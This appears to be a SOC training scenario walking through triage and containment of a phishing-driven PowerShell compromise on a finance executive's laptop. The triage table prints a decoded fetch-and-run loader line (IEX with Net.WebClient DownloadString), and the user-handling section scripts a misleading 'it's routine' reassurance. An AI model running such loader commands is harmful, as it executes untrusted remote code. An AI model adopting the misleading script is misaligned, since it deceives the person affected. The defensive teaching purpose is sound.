# Scenario 02 — BEC Phishing: Finance Executive Compromise

**Primary Tactic:** Initial Access → Execution → Command & Control
**Severity:** CRITICAL
**MITRE:** T1566.002 | T1059.001 | T1027 | T1036 | T1071.001

---

## Alert

```
[MEDIUM] Suspicious Outbound Connection
Host:       FIN-PRIYA-L01
Dest IP:    91.195.240.117
Port:       443
Time:       10:09 AM
Data:       2.3 MB outbound
```

**User report:** Finance executive Priya Nair received CEO impersonation email requesting urgent $85,000 wire transfer. She did not transfer funds but clicked a link to view an "invoice." Reports nothing happened when she clicked.

**Severity upgrade:** MEDIUM → CRITICAL
Reason: Finance executive + BEC pattern + "nothing happened" = silent execution + confirmed C2 timing correlation

---

## Triage Steps

| Step | Action | Finding |
|------|--------|---------|
| 1 | AbuseIPDB — 91.195.240.117 | 97% abuse confidence, flagged C2 by 43 reporters |
| 2 | Event ID 4688 — process chain | OUTLOOK.EXE → powershell.exe -EncodedCommand [Base64] |
| 3 | Decode Base64 payload | IEX (New-Object Net.WebClient).DownloadString(...) — fileless stage-2 loader |
| 4 | Check process list | Fake svchost.exe in C:\Users\Priya\AppData\Local\Temp\ — parent: explorer.exe |
| 5 | Verify against real svchost | Real path: C:\Windows\System32\svchost.exe — Real parent: services.exe |

---

## Event IDs Investigated

| Event ID | Finding |
|----------|---------|
| 4688 | OUTLOOK.EXE spawned powershell.exe with -EncodedCommand — T1059.001 |
| 4688 | Fake svchost.exe created in AppData\Temp — T1036 Masquerading |
| Network log | Active connection from fake svchost to 91.195.240.117:443 |

---

## MITRE ATT&CK

| Technique | ID |
|-----------|-----|
| Phishing: Spearphishing Link | T1566.002 |
| PowerShell | T1059.001 |
| Obfuscated Files or Information | T1027 |
| Masquerading | T1036 |
| C2 over HTTPS | T1071.001 |

---

## Containment Actions (in order)

1. Block 91.195.240.117 at perimeter firewall — protects all endpoints simultaneously
2. Isolate FIN-PRIYA-L01 via EDR
3. Memory dump before shutdown — IEX is fileless, no disk artifacts
4. Pull DNS/proxy logs — check if any other hosts contacted same C2

**How to handle the user:**

> ✅ *"Priya, we're seeing something on our network we need to check. Can I grab your laptop for 10 minutes? It's routine."*
> ❌ Do NOT say "your system might be compromised" — user may panic and restart, destroying volatile memory.

---

## Escalation Brief

> *"Started as medium, upgraded to Critical — C2 confirmed, BEC context. Finance exec Priya Nair clicked a phishing link at 10:08. SIEM shows 2.3 MB outbound to 91.195.240.117 at 10:09, AbuseIPDB 97% confidence C2 infrastructure. Process list shows fake svchost.exe in AppData\Temp with active connection to that IP, parent explorer.exe — confirmed T1036 masquerading. Laptop isolated via EDR. Recommending full forensic imaging before reimaging. Do you want me to engage IR team?"*

---

## Lessons Learned

- Block C2 at firewall FIRST — one rule protects all endpoints
- "Nothing happened when I clicked" = malware working silently
- IEX = fileless execution — memory dump is the only forensic artifact
- Investigation priority: laptop → C2 connection → email (email is preserved, memory isn't)
